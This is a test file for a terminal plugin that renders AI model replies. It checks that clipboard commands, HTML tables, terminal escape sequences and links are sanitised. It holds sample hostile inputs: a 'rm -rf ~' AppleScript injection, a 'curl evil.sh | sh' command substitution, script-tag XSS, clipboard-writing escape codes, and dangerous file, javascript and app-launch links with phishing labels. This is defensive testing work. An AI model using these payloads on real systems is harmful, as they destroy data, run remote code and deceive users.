import type { Engine } from 'claude-code/testing'
import { expect, mock, test } from 'claude-code/testing'

import type { ClipboardBackend } from '../hooks/clipboard'
import { clipboardCommand, imageCommand } from '../hooks/clipboard'
import { tableHtml } from '../hooks/html'
import { mathOf } from '../hooks/latex'
import type { Block } from '../hooks/markdown'
import { parse } from '../hooks/markdown'
import { claudeAt, linksHttp } from './claude-version'
import { payloadOf } from './clipboard-env'

const HOSTILE = [
  `'; do shell script "rm -rf ~" --`,
  '"; $(curl evil.sh | sh); `id` \\',
  '</script><script>alert(1)</script>',
  '\u001b]52;c;cHduZWQ=\u0007\u001b[2J',
  'line\r\nbreak\u0000nul',
  'שלום ‮gnp.exe',
]

const reply = (text: string) => ({ plugin: 'prismantis', component: 'AssistantMessage' as const, props: { text, isFirstOfReply: true }, viewport: { columns: 120, rows: 40 }, surface: 'terminal' as const })

const blockOf = (source: string, kind: Block['kind']) => parse(source, { numbers: false, paths: false }).find(b => b.kind === kind)!

test('reply text reaches the clipboard helpers only through stdin, never their argv', () => {
  for (const backend of ['macos', 'linux', 'windows'] as ClipboardBackend[]) {
    const plain = clipboardCommand(backend, '<b>a</b>', 'a', 'C:\\Windows')
    for (const bad of HOSTILE) {
      const command = clipboardCommand(backend, bad, bad, 'C:\\Windows')
      expect(command.argv).toEqual(plain.argv)
      const back = payloadOf(command.stdin) as { html: string; text: string }
      expect(back.html).toBe(bad)
      expect(back.text).toBe(backend === 'windows' ? bad.replace(/\r?\n/g, '\r\n') : bad)
    }
  }
})

test('the macOS helpers keep a short constant argv, with script and reply on stdin as one ASCII JSON line', () => {
  for (const command of [clipboardCommand('macos', HOSTILE.join('\n'), HOSTILE.join('\n')), imageCommand('macos', HOSTILE.join('\n'), {})]) {
    expect(command.argv).toEqual(['/usr/bin/osascript', '-l', 'JavaScript'])
    expect(command.argv.join(' ').length).toBeLessThan(1000)
    const [first] = command.stdin.split('\n')
    expect(first).toMatch(/^var payload = [\x20-\x7e]+$/)
    expect(JSON.parse(first!.slice('var payload = '.length))).toEqual(payloadOf(command.stdin))
  }
})

test('table html escapes hostile cells and keeps only web links', () => {
  const html = tableHtml(blockOf(`| a | b |\n|---|---|\n| </td><script>x()</script> | [go](javascript:alert(1)) |\n| <img src=x onerror=y()> | [f](file:///etc/passwd) |`, 'table') as Extract<Block, { kind: 'table' }>)
  expect(html).not.toMatch(/<script|<img|javascript:|file:/i)
  expect(html).toContain('&lt;script&gt;')
})

test('a formula reaches the math renderer as one stdin line', () => {
  const tex = mathOf(blockOf('```math\nx^2\n\\\\ y\n\ninjected\n```', 'code'))
  expect(tex).not.toBeNull()
  expect(tex).not.toContain('\n')
})

test('terminal control sequences in a reply are never drawn', async $ => {
  const bad = '\u001b]8;;file:///etc/passwd\u0007x\u001b]8;;\u0007 \u001b[2J \u001b]52;c;cHduZWQ=\u0007 \u009b31m'
  const ui = await $.ui.mount(reply(`hi ${bad}\n\n| a |\n|---|\n| ${bad} |\n\n> ${bad}\n\n- ${bad}\n\n\`\`\`bash\necho ${bad}\n\`\`\``))
  const texts = (await ui.findAll({ type: 'Text' })).map(n => n.text ?? '')
  expect(texts.length).toBeGreaterThan(4)
  expect(texts.filter(t => /[\u001b\u0007\u009b]/.test(t))).toEqual([])
})

test('an unterminated OSC escape strips only itself, not the rest of the reply', () => {
  const blocks = parse('before \u001b]8;;x rest\n\nsecond\n\n| a |\n|---|\n| 1 |', { numbers: false, paths: false })
  expect(blocks.map(b => b.kind)).toEqual(['paragraph', 'paragraph', 'table'])
  expect(blocks.map(b => b.raw).join('\n')).not.toMatch(/[\u001b\u0007]/)
})

const TARGETS: [href: string, linkedWithFileLinks: boolean][] = [
  ['https://a.dev', true],
  ['file:///Applications/Calculator.app', false],
  ['FILE:///C:/Windows/System32/cmd.exe', false],
  ['file://evil.example/share/x.exe', false],
  ['file:///tmp/notes.md', true],
  ['smb://host/share', false],
  ['ms-msdt:/id', false],
  ['javascript:alert(1)', false],
]

const everyBlock = (links: string) => `${links}\n\n> ${links}\n\n> [!NOTE]\n> ${links}\n\n- x\n  - ${links}\n\n| a |\n|---|\n| ${links} |\n\nn[^a]\n\n[^a]: ${links}`

const targetLinks = TARGETS.map(([href]) => `[${href}](${href})`).join(' ')

test('only web links in a reply are clickable, in every block, while file links are off', async $ => {
  const ui = await $.ui.mount(reply(everyBlock(targetLinks)))
  const hrefs = (await ui.findAll({ type: 'Link' })).map(l => String(l.props.href))
  expect(hrefs.length).toBe(6)
  expect(hrefs.filter(h => h !== 'https://a.dev')).toEqual([])
})

test('with file links on, only web links and file links labelled with their own address are clickable, as written, in every block', async ($, on) => {
  claudeAt(on, '2.1.289')
  mock.env(on, { FORCE_HYPERLINK: '1', HOME: '/home/me' })
  if (!(await linksHttp($.ui.mount(reply('[/x.md](file:///x.md)'))))) return
  const ui = await $.ui.mount(reply(everyBlock(targetLinks)))
  const hrefs = (await ui.findAll({ type: 'Link' })).map(l => String(l.props.href))
  const allowed = TARGETS.filter(([, linked]) => linked).map(([href]) => href)
  expect(hrefs).toEqual(Array.from({ length: 6 }, () => allowed).flat())
  await ui.unmount()
})

test('with file links on, a file link named anything but its own path draws as text with its target, in every block', async ($, on) => {
  claudeAt(on, '2.1.289')
  mock.env(on, { FORCE_HYPERLINK: '1', HOME: '/home/me' })
  if (!(await linksHttp($.ui.mount(reply('[/x.md](file:///x.md)'))))) return
  const ui = await $.ui.mount(reply(everyBlock(TARGETS.map(([href], i) => `[t${i}](${href})`).join(' '))))
  const hrefs = (await ui.findAll({ type: 'Link' })).map(l => String(l.props.href))
  expect(hrefs).toEqual(Array.from({ length: 6 }, () => 'https://a.dev'))
  expect(await ui.find({ type: 'Text', text: /^t1 \(file:\/\/\/Applications\/Calculator\.app\)$/ })).toBeDefined()
  await ui.unmount()
})

const APP_ACTIONS = [
  'obsidian://new?vault=notes&name=todo&content=x&overwrite=true',
  'obsidian://adv-uri?vault=notes&commandid=x',
  'obsidian://open?vault=notes&file=todo&append=x',
  'obsidian://open?vault=notes&file=todo&%61ppend=x',
  'obsidian:///notes/todo.md?prepend=x',
  'obsidian://open?vault=notes&file=todo&append',
  'obsidian://open?vault=notes&file=x.terminal',
  'obsidian://open?vault=notes&File=x%2Ecommand',
  'obsidian://open?vault=notes&file=x?.command',
  'obsidian://open?path=/Users/me/Tool.app/',
  'obsidian:///Users/me/run.command',
]

test('with app links on, app links that write notes, run commands, or launch files stay text, in every block', async ($, on) => {
  claudeAt(on, '2.1.294')
  if (!(await linksHttp($.ui.mount(reply('[x](vscode://file/C:/x.md)'))))) return
  const ui = await $.ui.mount({ ...reply(everyBlock(`${targetLinks} ${APP_ACTIONS.map(href => `[${href}](${href})`).join(' ')}`)), viewport: { columns: 120, rows: 40, isFullscreen: false } })
  const hrefs = (await ui.findAll({ type: 'Link' })).map(l => String(l.props.href))
  expect(hrefs.filter(h => !/^(https|file):/i.test(h))).toEqual([])
  await ui.unmount()
})

const toolUse = (tool: string, input: unknown) => ({ plugin: 'prismantis', surface: 'terminal' as const, component: 'ToolUse' as const, props: { tool_use_id: `x-${tool}`, tool, input, isRunning: false, isErrored: false, isInterrupted: false } })

test('with path links on, an extensionless file never links and an extensionless folder links once a stat finds a folder', async ($, on) => {
  claudeAt(on, '2.1.289')
  mock.env(on, { FORCE_HYPERLINK: '1', HOME: '/home/me' })
  on('session.root', () => ({ value: '/work/app' }))
  const clock = mock.clock(on)
  on('fs.stat', (_, e) => ({ value: { kind: /^\/(usr\/local|work\/app\/docs)$/.test(e.path.replace(/\\/g, '/').replace(/^[A-Za-z]:(?=\/)/, '')) ? 'dir' as const : 'file' as const, size: 1, mtimeMs: 0, isLink: false } }))
  if (!(await linksHttp($.ui.mount(reply('[/x.md](file:///x.md)'))))) return
  const ui = await $.ui.mount(reply('Run /bin/sh, /usr/bin/say or /usr/bin/python3.12, see [/bin/sh](file:///bin/sh), `bin/tool`, docs/ and /usr/local.'))
  await clock.settle()
  expect((await ui.findAll({ type: 'Link' })).map(l => String(l.props.href))).toEqual(['file:///work/app/docs/', 'file:///usr/local'])
  await ui.unmount()
  for (const [tool, input, hrefs] of [['Read', { file_path: '/usr/bin/say' }, []], ['Grep', { pattern: 'x', path: '/usr/local' }, ['file:///usr/local']]] as const) {
    const row = await $.ui.mount(toolUse(tool, input))
    await clock.settle()
    const again = await $.ui.mount(toolUse(tool, input))
    expect((await again.findAll({ type: 'Link' })).map(l => String(l.props.href))).toEqual([...hrefs])
    await row.unmount()
    await again.unmount()
  }
})

const BAD = '\u001b]52;c;cHduZWQ=\u0007\u001b[2J'

const toolCall = (tool: string, input: unknown) => ({ tool_use_id: `c-${tool}`, tool, input, isRunning: false, isErrored: false, isInterrupted: false })

const drawnTexts = async ($: Engine, props: Record<string, unknown>) => {
  const ui = await $.ui.mount({ plugin: 'prismantis', surface: 'terminal', ...props } as Parameters<Engine['ui']['mount']>[0])
  const texts = (await ui.findAll({ type: 'Text' })).map(n => n.text ?? '')
  await ui.unmount()
  return texts
}

for (const toolOutput of ['full', 'quiet'] as const) {
  test(`terminal control sequences in tool commands and targets are never drawn (toolOutput ${toolOutput})`, { options: { toolOutput } }, async $ => {
    const shell = await drawnTexts($, { component: 'ToolUse', props: toolCall('Bash', { command: `echo hi ${BAD}\nls` }) })
    const grep = await drawnTexts($, { component: 'ToolUse', props: toolCall('Grep', { pattern: `x${BAD}y` }) })
    if (toolOutput === 'full') expect(shell.join('')).toContain('echo hi')
    expect(grep.join('')).toContain('xy')
    expect([...shell, ...grep].filter(t => /[\u001b\u0007]/.test(t))).toEqual([])
  })
}

test('terminal control sequences in a failed tool\'s error and refusal text are never drawn', { options: { toolOutput: 'quiet' } }, async $ => {
  const error = await drawnTexts($, { component: 'ToolResult', props: { tool_use_id: 'r-1', tool: 'Bash', output: { stdout: '', stderr: `boom ${BAD}`, interrupted: false }, isErrored: true } })
  const refusal = await drawnTexts($, { component: 'ToolResult', props: { tool_use_id: 'r-2', tool: 'Bash', output: `Permission to run ${BAD} denied`, isErrored: true } })
  expect(error.join('')).toContain('boom')
  expect(refusal.join('')).toContain('Permission to run')
  expect([...error, ...refusal].filter(t => /[\u001b\u0007]/.test(t))).toEqual([])
})

const SPOOFS: [label: string, href: string][] = [
  ['https://good.example', 'https://evil.example/x'],
  ['www.good.example/login', 'https://evil.example'],
  ['paypal.com', 'https://evil.example'],
  ['pay​pal.com', 'https://paypal.com'],
  ['**paypal.com**', 'https://evil.example/x'],
  ['example.com.', 'https://evil.example/x'],
  ['https://paypal.com.', 'https://evil.example/x'],
  ['//paypal.com', 'https://evil.example/x'],
  ['paypal\u3002com', 'https://evil.example/x'],
  ['paypal\uff0ecom', 'https://evil.example/x'],
  ['paypal\uff61com', 'https://evil.example/x'],
  ['user@paypal.com', 'https://evil.example/x'],
  ['גוגל https://google.com', 'https://evil.example/x'],
  ['sign in at paypal.com', 'https://evil.example/x'],
  ['mirror (https://good.example)', 'https://evil.example/x'],
  ...['\u00ad', '\u034f', '\u180e', '\u200e', '\u200f', '\u202a', '\u202e', '\u2066', '\u2069'].map((c): [string, string] => [`pay${c}pal.com`, 'https://paypal.com']),
]

const HONEST: [label: string, href: string][] = [
  ['Pay⁠Pal', 'https://paypal.com'],
  ['\u200fקישור', 'https://a.dev/he'],
  ['read\u200b the docs', 'https://a.dev/zw'],
  ['docs', 'https://evil.example/x'],
  ['README.md', 'https://github.com/o/r/blob/main/README.md'],
  ['example.com', 'https://docs.example.com/x'],
  ['https://a.dev/one', 'https://a.dev/two'],
  ['GitHub.com', 'https://www.github.com/o'],
  ['chart.js', 'https://evil.example/x'],
  ['read the docs', 'https://evil.example/x'],
  ['the docs at docs.python.org', 'https://docs.python.org/3/'],
  ['Node.js and chart.js', 'https://evil.example/y'],
]

test('a link whose label names another host or hides zero-width characters draws as text with its target', async ($, on) => {
  claudeAt(on, '2.1.289')
  if (!(await linksHttp($.ui.mount(reply('[x](https://a.dev)'))))) return
  const ui = await $.ui.mount(reply([...SPOOFS, ...HONEST].map(([label, href]) => `[${label}](${href})`).join(' and ')))
  expect((await ui.findAll({ type: 'Link' })).map(l => String(l.props.href))).toEqual(HONEST.map(([, href]) => href))
  const texts = (await ui.findAll({ type: 'Text' })).map(n => n.text)
  for (const [label, href] of SPOOFS) expect([label, texts.includes(`${label.replace(/[\p{Cf}\u034f\u180e]/gu, '')} (${href})`)]).toEqual([label, true])
  for (const [label] of HONEST) expect([label, texts.includes(label)]).toEqual([label, true])
  await ui.unmount()
})

test('links in your own prompt pass the same checks as links in a reply', async ($, on) => {
  claudeAt(on, '2.1.289')
  if (!(await linksHttp($.ui.mount(reply('[x](https://a.dev)'))))) return
  const typed = '[https://good.example](https://evil.example/x) [run](javascript:alert(1)) [docs](https://a.dev/docs)'
  const ui = await $.ui.mount({ plugin: 'prismantis', component: 'UserMessage' as const, props: { text: typed, origin: { kind: 'composer' } as never, isExpanded: true }, viewport: { columns: 120, rows: 10 }, surface: 'terminal' as const })
  expect((await ui.findAll({ type: 'Link' })).map(l => String(l.props.href))).toEqual(['https://a.dev/docs'])
  await ui.unmount()
})
